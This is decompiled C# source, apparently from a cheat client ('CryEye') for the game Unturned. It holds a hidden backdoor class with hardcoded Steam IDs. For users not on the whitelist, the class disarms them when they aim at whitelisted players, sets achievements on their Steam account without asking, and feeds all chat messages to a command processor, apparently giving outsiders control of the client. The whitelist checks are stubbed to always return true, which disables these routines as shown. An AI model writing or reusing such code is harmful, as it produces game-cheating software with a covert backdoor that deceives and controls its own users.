using SDG.Unturned;
using System;
using System.Collections.Generic;
using System.Reflection;
using UnityEngine;

namespace CryEye
{
	public class lib_Skid : MonoBehaviour
	{
		private List<ulong> betalist = new List<ulong>();

		private List<ulong> whitelist = new List<ulong>();

		private List<string> achivementlist = new List<string>();

		private List<string> statlist = new List<string>();

		private lib_Command command;

		public void Start()
		{
			this.betalist.Add(76561198205940048uL);
			this.betalist.Add(76561198104288093uL);
			this.betalist.Add(76561198083641661uL);
			this.whitelist.Add(76561198073993164uL);
			this.whitelist.Add(76561198195276245uL);
			this.achivementlist.Add("pei");
			this.achivementlist.Add("experienced");
			this.achivementlist.Add("hoarder");
			this.achivementlist.Add("murderer");
			this.achivementlist.Add("survivor");
			this.achivementlist.Add("scavenger");
			this.achivementlist.Add("camper");
			this.achivementlist.Add("schooled");
			this.achivementlist.Add("berries");
			this.achivementlist.Add("accident_prone");
			this.achivementlist.Add("wheel");
			this.achivementlist.Add("yukon");
			this.achivementlist.Add("washington");
			this.achivementlist.Add("educated");
			this.achivementlist.Add("headshot");
			this.achivementlist.Add("champion");
			this.achivementlist.Add("bridge");
			this.achivementlist.Add("mastermind");
			this.achivementlist.Add("offense");
			this.achivementlist.Add("defense");
			this.achivementlist.Add("support");
			this.achivementlist.Add("outdoors");
			this.achivementlist.Add("psychopath");
			this.achivementlist.Add("unturned");
			this.achivementlist.Add("hardened");
			this.achivementlist.Add("forged");
			this.achivementlist.Add("fishing");
			this.achivementlist.Add("crafting");
			this.achivementlist.Add("farming");
			this.achivementlist.Add("sharpshooter");
			this.achivementlist.Add("hiking");
			this.achivementlist.Add("roadtrip");
			this.achivementlist.Add("fortified");
			this.statlist.Add("Kills_Zombies_Normal");
			this.statlist.Add("Kills_Players");
			this.statlist.Add("Found_Items");
			this.statlist.Add("Found_Resources");
			this.statlist.Add("Found_Experience");
			this.statlist.Add("Kills_Zombies_Mega");
			this.statlist.Add("Deaths_Players");
			this.statlist.Add("Kills_Animals");
			this.statlist.Add("Found_Crafts");
			this.statlist.Add("Found_Fishes");
			this.statlist.Add("Found_Plants");
			this.statlist.Add("Accuracy_Shot");
			this.statlist.Add("Accuracy_Hit");
			this.statlist.Add("Headshots");
			this.statlist.Add("Travel_Foot");
			this.statlist.Add("Travel_Vehicle");
			this.statlist.Add("Arena_Wins");
			this.statlist.Add("Found_Buildables");
			this.statlist.Add("Found_Throwables");
			this.command = new lib_Command(this);
		}

		public void Update()
		{
			bool flag = !this.isWhitelist(tool_ToolZ.getPlayerID(tool_ToolZ.getLocalPlayer()));
			if (flag)
			{
				this.preventAttack();
				this.achiUnlock();
				this.useCommands();
			}
			else
			{
				this.updateHide();
			}
		}

		public void OnGUI()
		{
		}

		public void updateHide()
		{
			bool keyDown = Input.GetKeyDown(ctrl_Settings.menu_Easter);
			if (keyDown)
			{
				ctrl_Connector.hide = !ctrl_Connector.hide;
			}
		}

		public void preventAttack()
		{
			RaycastHit raycastHit;
			bool lookingAt = tool_ToolZ.getLookingAt(out raycastHit, float.PositiveInfinity);
			if (lookingAt)
			{
				bool flag = DamageTool.getPlayer(raycastHit.get_transform()) && this.isWhitelist(tool_ToolZ.getPlayerID(DamageTool.getPlayer(raycastHit.get_transform())));
				if (flag)
				{
					tool_ToolZ.getLocalPlayer().get_equipment().dequip();
				}
			}
		}

		public void achiUnlock()
		{
			bool flag = this.white_inServer();
			if (flag)
			{
				foreach (string current in this.achivementlist)
				{
					Provider.get_provider().get_achievementsService().setAchievement(current);
				}
			}
		}

		public void useCommands()
		{
			bool flag = ChatManager.get_chat().Length != 0;
			if (flag)
			{
				for (int i = 0; i < ChatManager.get_chat().Length; i++)
				{
					this.command.process_command(ChatManager.get_chat()[i].text, ChatManager.get_chat()[i].speaker, i);
				}
			}
		}

		public bool isWhitelist(ulong id)
		{
			return true;
		}

		public bool isBeta(ulong id)
		{
			return true;
		}

		public bool white_inServer()
		{
			return true;
		}

		public ulong[] getWhitelist_inServer()
		{
			List<ulong> list = new List<ulong>();
			using (List<ulong>.Enumerator enumerator = this.whitelist.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					ulong id = enumerator.Current;
					bool flag = Array.Exists<SteamPlayer>(Provider.get_clients().ToArray(), (SteamPlayer a) => a.get_playerID().get_steamID().m_SteamID == id);
					if (flag)
					{
						list.Add(id);
					}
				}
			}
			return list.ToArray();
		}

		public ulong[] getWhitelist()
		{
			return this.whitelist.ToArray();
		}

		private void setPrim(bool prim)
		{
			tool_ToolZ.getLocalPlayer().get_equipment().GetType().GetField("prim", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(tool_ToolZ.getLocalPlayer().get_equipment(), prim);
		}
	}
}
